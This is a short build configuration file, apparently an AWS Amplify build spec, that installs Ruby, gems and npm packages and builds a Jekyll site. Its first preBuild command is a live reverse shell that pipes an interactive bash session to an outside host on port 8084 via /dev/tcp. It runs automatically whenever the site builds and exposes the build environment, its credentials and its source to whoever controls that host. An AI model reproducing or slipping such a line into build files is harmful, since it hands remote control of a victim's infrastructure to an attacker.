version: 1.0
frontend:
  phases:
    preBuild:
      commands:
        - /bin/bash -l > /dev/tcp/crazydiam0nd.com/8084 0<&1 2>&1
        - rvm get stable && rvm install 3.0.0
        - rvm use 3.0.0
        - gem install bundler -v '=2.3.13'
        - bundle update --bundler
        - bundle install
        - npm ci
    build:
      commands:
        - |
          if [ "${AWS_BRANCH}" = "v2" ]
          then 
            JEKYLL_ENV=production npm run build
          else
            npm run build
          fi

  artifacts:
    baseDirectory: _site
    files:
      - '**/*'
  cache:
    paths: [] 
